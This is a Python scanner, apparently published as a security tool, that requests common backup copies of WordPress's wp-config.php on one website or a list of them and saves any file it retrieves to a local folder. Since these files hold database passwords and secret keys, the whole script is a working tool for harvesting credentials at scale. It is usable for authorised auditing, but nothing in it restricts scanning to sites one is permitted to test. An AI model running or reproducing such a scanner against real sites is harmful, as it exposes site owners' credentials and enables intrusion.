import argparse, requests, sys, os
import re
from argparse import RawTextHelpFormatter

def banner():
    return '''
 __      _____  ___           __ _      _             _   
 \ \    / / _ \/ __|___ _ _  / _(_)__ _| |   ___ __ _| |__
  \ \/\/ /|  _/ (__/ _ \ ' \|  _| / _` | |__/ -_) _` | / /
   \_/\_/ |_|  \___\___/_||_|_| |_\__, |____\___\__,_|_\_\\
                                  |___/                   

Tool to search for leaked wp-config.php backups on websites. by firedragon9511.

\033[1mWebsite:\033[0m https://decriptosec.com
\033[1mLinkedIn:\033[0m https://www.linkedin.com/in/jsvf/
\033[1mPage:\033[0m https://www.linkedin.com/company/decriptosec/
'''

OUTPUT_DIR = "Leak_Output"

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def log(msg):
    print(f"{bcolors.OKGREEN}[+]", msg, f"{bcolors.ENDC}")

def err(msg):
    print(f"{bcolors.FAIL}[-]", msg, f"{bcolors.ENDC}")

def test_backups(url_list: list):
    files = f'''wp-config.php.bck
wp-config.php.bk
wp-config.php.bck
wp-config.php.backup
wp-config.php.bak
wp-config.php.save
wp-config.php.old
app-ads.txt
wp-config.bak
wp-config.php.sav
wp-config.php.bkp
wp-config.php.tmp
wp-config.tmp.php
wp-config.php.copy
wp-config
wp-config.old.php
wp-config_backup.php
wp-config.php_OLD
backup_wp-config.php
wp-config.php-bk
.wp-config.php.swp
wp-config.php~'''.split("\n")

    for u in url_list:
        for f in files:
            domain = "https://" + u if "https://" not in u and "http://" not in u else u

            req_url = domain + "/" + f
            result = requests.get(req_url)
            status_code = result.status_code
            if status_code == 200:
                print(bcolors.OKGREEN, "[" + str(status_code) + "]", req_url, bcolors.ENDC)

                output_file_name = u.replace("://", "_").replace("/", "_") + f
                with open(os.path.join(OUTPUT_DIR, output_file_name), "w+") as file:
                    file.write(result.text)
            else:
                print(bcolors.FAIL, "[" + str(status_code) + "]", req_url, bcolors.ENDC)
    pass

def get_from_pipe():
    result = []
    for line in sys.stdin:
        result.append(line.strip())
    return result


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description=banner(),formatter_class=RawTextHelpFormatter)
    parser.add_argument('-u', '--url', type=str, help="WordPress website URL.")
    parser.add_argument('-uL', '--url-list', type=str, help="Website wordlist URL")

    args = parser.parse_args()

    printed_passwords = 0

    if not os.path.exists(OUTPUT_DIR):
        os.mkdir(OUTPUT_DIR)

    if args.url:
        test_backups([args.url])
    elif args.url_list:
        with open(args.url_list, "r") as file:
            test_backups(file.read().split("\n"))
    else:
        test_backups(get_from_pipe())